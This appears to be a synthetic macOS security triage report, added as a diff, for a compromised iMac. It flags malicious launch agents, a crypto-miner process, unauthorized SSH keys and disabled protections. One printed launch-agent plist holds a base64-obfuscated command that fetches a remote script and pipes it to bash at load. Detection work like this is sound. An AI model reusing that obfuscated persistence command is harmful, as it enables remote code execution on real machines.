@@ -1,0 +1,254 @@
+===============================
+macOS Security Triage Report
+===============================
+Date: Wed Nov 17 14:45:30 PST 2024
+User: victimuser
+Hostname: Victims-iMac.local
+
+This is a READ-ONLY scan - nothing will be changed or deleted
+Output will be saved to: /Users/victimuser/Desktop/security-scan-20241117-144530.txt
+
+===============================
+1. Suspicious Launch Agents
+===============================
+--- User Launch Agents ---
+total 16
+drwx------@ 5 victimuser  staff   160 Nov 16 23:45 .
+drwx------+ 34 victimuser  staff  1088 Nov 17 09:15 ..
+-rw-r--r--   1 victimuser  staff   847 Nov 16 23:45 com.Wlan.Software.plist
+
+--- System Launch Agents ---
+total 368
+drwxr-xr-x  46 root  wheel   1472 Nov 16 23:47 .
+drwxr-xr-x  65 root  wheel   2080 Nov 10 16:45 ..
+-rw-r--r--   1 root  wheel    570 Oct 25 14:33 com.adobe.AAM.Updater-1.0.plist
+-rw-r--r--   1 root  wheel    892 Nov 16 23:47 com.update.service.plist
+-rw-r--r--   1 root  wheel   1228 Nov  5 12:15 com.apple.AirPlayXPCHelper.plist
+
+--- System Launch Daemons ---
+total 1264
+drwxr-xr-x  158 root  wheel   5056 Nov 16 23:48 .
+drwxr-xr-x   65 root  wheel   2080 Nov 10 16:45 ..
+-rw-r--r--    1 root  wheel    442 Nov  5 12:15 com.apple.AccessoryUpdaterHelper.plist
+-rw-r--r--    1 root  wheel    683 Nov 16 23:48 com.system.helper.plist
+
+----- Showing contents of non-Apple LaunchAgents -----
+>> /Users/victimuser/Library/LaunchAgents/com.Wlan.Software.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>com.Wlan.Software</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/bin/sh</string>
+		<string>-c</string>
+		<string>echo "Y3VybCAtcyBodHRwOi8vbWFsaWNpb3VzLnNpdGUuY29tL3BheWxvYWQuc2ggfCBiYXNo" | base64 -d | sh</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>KeepAlive</key>
+	<true/>
+</dict>
+</plist>
+
+>> /Library/LaunchAgents/com.update.service.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>com.update.service</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/tmp/updater</string>
+		<string>-d</string>
+		<string>--stealth</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>StartInterval</key>
+	<integer>3600</integer>
+</dict>
+</plist>
+
+>> /Library/LaunchDaemons/com.system.helper.plist
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>Label</key>
+	<string>com.system.helper</string>
+	<key>ProgramArguments</key>
+	<array>
+		<string>/usr/local/bin/kmod</string>
+		<string>--background</string>
+	</array>
+	<key>RunAtLoad</key>
+	<true/>
+	<key>UserName</key>
+	<string>nobody</string>
+</dict>
+</plist>
+
+===============================
+2. Loaded kexts (Realtek, HoRNDIS, unsigned)
+===============================
+   97    0 0xffffff7f82a00000 0x15000    0x15000    com.realtek.wifi.driver (1.0.0) 4D2F7A5E-8E4A-4F1B-9B2C-3E7F8A9B1C2D <8 6 5 3 1>
+  145    0 0xffffff7f82b50000 0x8000     0x8000     org.pqrs.driver.Karabiner.VirtualHIDDevice.v061000 (0.6.10) 9A8B7C6D-5E4F-3A2B-1C9D-8E7F6A5B4C3D <7 5 4 3 1>
+
+===============================
+3. Persistence via Login Items
+===============================
+Spotify, Dropbox, Malicious Helper, System Updater, .hidden-app
+
+===============================
+4. Suspicious Processes (non-root, non-user)
+===============================
+  PID  %CPU %MEM      VSZ    RSS   TT  STAT STARTED      TIME COMMAND
+_windowserver  150   1.5  1.0  8713392  82944   ??  Ss    9:15AM   0:08.45 /System/Library/PrivateFrameworks/SkyLight.framework/Resources/WindowServer -daemon
+_spotlight     189   0.0  0.2  4334592  15008   ??  Ss    9:15AM   0:01.23 /System/Library/CoreServices/Spotlight.app/Contents/MacOS/Spotlight
+nobody        2847  65.2  2.1  4512784 175392   ??  R    23:47PM   45:23.89 /tmp/xmrig --config=/tmp/.config.json
+nobody        2891   0.3  0.1  4281456   8944   ??  Ss   23:48PM   0:02.67 /usr/local/bin/kmod --background
+daemon        2934   1.2  0.8  4398576  67232   ??  S    23:49PM   2:13.45 /tmp/updater -d --stealth
+
+===============================
+5. Network Listeners
+===============================
+COMMAND     PID      USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+rapportd    298   victimuser    3u  IPv4 0x1234567890      0t0  TCP *:63342 (LISTEN)
+Spotify     445   victimuser   23u  IPv4 0x1234567891      0t0  TCP 127.0.0.1:4370 (LISTEN)
+updater    2934       daemon   7u  IPv4 0x1234567892      0t0  TCP *:4444 (LISTEN)
+kmod       2891       nobody  12u  IPv4 0x1234567893      0t0  TCP *:8888 (LISTEN)
+xmrig      2847       nobody  15u  IPv4 0x1234567894      0t0  TCP *:6666 (LISTEN)
+
+===============================
+6. Active outbound connections
+===============================
+tcp4       0      0  192.168.1.105.63451    185.220.101.47.4444    ESTABLISHED
+tcp4       0      0  192.168.1.105.63450    94.156.78.123.8080     ESTABLISHED
+tcp4       0      0  192.168.1.105.63449    185.220.101.47.4444    ESTABLISHED
+tcp4       0      0  192.168.1.105.63448    178.62.85.41.443       ESTABLISHED
+tcp4       0      0  192.168.1.105.63447    malicious.command.site.80 ESTABLISHED
+tcp4       0      0  192.168.1.105.63446    pool.supportxmr.com.4444 ESTABLISHED
+tcp4       0      0  192.168.1.105.63445    17.253.144.10.443      ESTABLISHED
+
+===============================
+7. SSH keys + config
+===============================
+total 48
+drwx------  8 victimuser  staff   256 Nov 16 23:52 .
+drwxr-xr-x+ 34 victimuser  staff  1088 Nov 17 09:15 ..
+-rw-r--r--   1 victimuser  staff   222 Oct 20 16:30 config
+-rw-------   1 victimuser  staff   411 Oct 20 16:30 id_ed25519
+-rw-r--r--   1 victimuser  staff   101 Oct 20 16:30 id_ed25519.pub
+-rw-------   1 victimuser  staff   803 Nov 10 14:22 known_hosts
+-rw-r--r--   1 victimuser  staff   742 Nov 16 23:52 authorized_keys
+--- authorized_keys ---
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKjQw... victimuser@iMac
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqaj... user@localhost
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHx9mPv... 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMxK8Hn... backup@system
+
+===============================
+8. Remote Login / Screen Sharing
+===============================
+Remote Login: On
+--- Screen Sharing Status ---
+    0	com.apple.screensharing
+Screen sharing appears to be ENABLED
+
+===============================
+9. Configuration Profiles
+===============================
+_computerlevel[1] attribute: profileIdentifier: com.malicious.profile
+_computerlevel[1] attribute: profileUUID: A1B2C3D4-E5F6-G7H8-I9J0-K1L2M3N4O5P6
+_computerlevel[1] attribute: profileType: Configuration
+_computerlevel[1] attribute: profileVersion: 1
+
+There is 1 configuration profile installed
+
+===============================
+10. Recent system modifications (last 48h)
+===============================
+Checking for recently modified files in system locations...
+-rw-r--r--   1 victimuser  staff    847 Nov 16 23:45 /Users/victimuser/Library/LaunchAgents/com.Wlan.Software.plist
+-rw-r--r--   1 root       wheel    892 Nov 16 23:47 /Library/LaunchAgents/com.update.service.plist
+-rw-r--r--   1 root       wheel    683 Nov 16 23:48 /Library/LaunchDaemons/com.system.helper.plist
+-rwxr-xr-x   1 nobody     staff  45632 Nov 16 23:46 /tmp/updater
+-rwxr-xr-x   1 nobody     staff 234567 Nov 16 23:45 /tmp/xmrig
+-rwxr-xr-x   1 root       wheel  12345 Nov 16 23:48 /usr/local/bin/kmod
+-rw-r--r--   1 nobody     staff    456 Nov 16 23:45 /tmp/.config.json
+
+===============================
+11. Recent auth events (last 2h)
+===============================
+2024-11-17 09:15:32.123456-0800  SecurityAgent[156]: User victimuser logged in successfully
+2024-11-17 12:47:15.789012-0800  sshd[2823]: Accepted publickey for victimuser from 185.220.101.47 port 54321 ssh2
+2024-11-17 13:15:22.456789-0800  sshd[2867]: Accepted publickey for victimuser from 94.156.78.123 port 42187 ssh2
+2024-11-17 13:52:33.891234-0800  loginwindow[89]: Login Window - User Switching attempted by unknown process
+2024-11-17 14:23:44.567890-0800  authd[298]: Authentication succeeded for user victimuser (UID 501) from unknown source
+
+===============================
+12. Additional Security Checks
+===============================
+--- Firewall Status ---
+Firewall is disabled. (State = 0)
+
+--- System Integrity Protection ---
+System Integrity Protection status: disabled
+    Apple Internal: disabled
+    Kext Signing: disabled
+    Filesystem Protections: disabled
+    Debugging Restrictions: disabled
+    DTrace Restrictions: disabled
+    NVRAM Protections: disabled
+    BaseSystem Verification: disabled
+
+--- FileVault Status ---
+FileVault is Off.
+
+--- Gatekeeper Status ---
+assessments disabled
+
+===============================
+13. Summary
+===============================
+🚨 CRITICAL SECURITY ISSUES DETECTED! 🚨
+
+IMMEDIATE THREATS FOUND:
+- MALWARE: com.Wlan.Software.plist with Base64 payload
+- BACKDOOR: Multiple unauthorized SSH keys
+- CRYPTOCURRENCY MINER: xmrig process using 65% CPU
+- PERSISTENCE: Multiple malicious Launch Agents/Daemons
+- BACKDOOR PORTS: Services listening on 4444, 8888, 6666
+- C&C COMMUNICATION: Connections to mining pools and suspicious IPs
+
+SECURITY FEATURES DISABLED:
+- System Integrity Protection: DISABLED
+- Firewall: DISABLED  
+- FileVault: DISABLED
+- Gatekeeper: DISABLED
+- Remote access: ENABLED without authorization
+
+SUSPICIOUS KERNEL EXTENSIONS:
+- com.realtek.wifi.driver (potentially malicious)
+
+ACTION REQUIRED:
+1. DISCONNECT FROM NETWORK IMMEDIATELY
+2. DO NOT RESTART THE SYSTEM
+3. CONTACT IT SECURITY OR INCIDENT RESPONSE
+4. PRESERVE THIS REPORT FOR ANALYSIS
+
+Report saved to: /Users/victimuser/Desktop/security-scan-20241117-144530.txt
+
+==============================
+⚠️  SYSTEM COMPROMISED  ⚠️
+==============================
+This system shows clear signs of malware infection and unauthorized access.
+IMMEDIATE PROFESSIONAL ASSISTANCE RECOMMENDED.
+
+Do not use this system for sensitive activities until properly cleaned and secured.
+
+Contact your IT security team or a cybersecurity professional immediately.
